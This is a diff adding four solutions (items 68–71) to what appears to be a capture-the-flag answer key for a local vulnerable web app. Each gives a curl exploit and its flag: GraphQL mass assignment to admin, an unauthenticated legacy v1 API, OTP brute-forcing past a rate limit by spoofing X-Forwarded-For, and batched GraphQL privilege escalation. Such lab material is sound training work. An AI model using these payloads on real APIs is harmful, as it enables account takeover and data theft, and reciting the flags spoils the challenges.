@@ -573,3 +573,32 @@ ECB with a static key — identical plaintext blocks → identical ciphertext bl
 ```bash
 curl -s localhost:4060/api/seal -H 'content-type: application/json' -d '{"data":"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"}'   # FLAG{lj_aes_ecb_pattern_leak}
 ```
+
+---
+
+# v10 — API boss
+
+### 68. Mass assignment via GraphQL · `POST /graphql`
+`updateProfile` trusts `role`/`isAdmin`, no auth:
+```bash
+curl -s localhost:4060/graphql -H 'content-type: application/json' -d '{"query":"mutation { updateProfile(id:5, role:\"admin\", isAdmin:true){ id role } }"}'   # FLAG{lj_graphql_mass_assignment}
+```
+
+### 69. Improper API inventory · `GET /api/v1/orders/:id`
+The deprecated v1 API is still live with no auth (v2 tightened it):
+```bash
+curl -s localhost:4060/api/v1/orders/40901   # FLAG{lj_api_inventory_drift}
+```
+
+### 70. Rate-limit bypass via `X-Forwarded-For` · `POST /api/otp/verify`
+The limiter keys on the spoofable `X-Forwarded-For` header — rotate it to brute freely:
+```bash
+for i in $(seq 0 6); do curl -s localhost:4060/api/otp/verify -H "x-forwarded-for: 10.0.0.$i" \
+  -H 'content-type: application/json' -d '{"code":"000"}'; done   # FLAG{lj_ratelimit_xff_bypass}
+```
+
+### 71. GraphQL batch privilege escalation · `POST /graphql`
+Multiple privileged mutations in one unauth doc:
+```bash
+curl -s localhost:4060/graphql -H 'content-type: application/json' -d '{"query":"mutation { a:mintPoints(userId:5,amount:1){id} b:adminDumpUsers{email} }"}'   # FLAG{lj_graphql_batch_privesc}
+```
